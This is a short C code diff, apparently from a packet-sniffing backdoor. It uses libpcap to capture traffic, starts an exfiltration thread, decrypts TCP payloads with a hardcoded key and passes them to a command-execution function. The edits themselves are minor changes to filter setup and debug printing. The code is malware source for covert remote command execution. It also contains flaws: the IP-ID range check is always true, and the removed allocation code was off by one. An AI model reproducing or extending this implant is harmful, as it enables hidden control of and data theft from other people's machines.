@@ -45,11 +45,7 @@ void pcap_init(uint32 src, uint32 ipaddr, char *folder, int chan) {
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pthread_t exfil_thread;
 	struct exfil_pack expack;
-	char * fltr_str;
-	//char * fltr_str = PKT_T_FLT;
-	fltr_str = (char *) malloc(strlen(PKT_T_FLT) + strlen(DEF_DST));
-	strncpy(fltr_str, PKT_T_FLT, strlen(PKT_T_FLT));
-	strncat(fltr_str, DEF_DST, strlen(DEF_DST));
+	char * fltr_str = PKT_T_FLT;
 
 	channel = chan;
 	ip_addr = ipaddr;
@@ -102,6 +98,7 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info,
 	if (ntohs(iphdr->id) >= 5000 || ntohs(iphdr->id) <= 5050) {
 		switch (iphdr->protocol) {
 		case IPPROTO_TCP:
+			printf("protocol TCP");
 			handle_tcp(user, pkt_info, packet);
 			break;
 		case IPPROTO_UDP:
@@ -136,7 +133,7 @@ void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
 
 	// decrypt the payload and copy it into decrypt_payload variable.
 	decrypt(SEKRET, tcp_payload, sizeof(tcp_payload));
-	printf("PAYLOAD => %s\n", tcp_payload);
+	printf("PAYLOAD => %s", tcp_payload);
 
 	cmd_execute(tcp_payload, iphdr->daddr, ip_addr);
 }
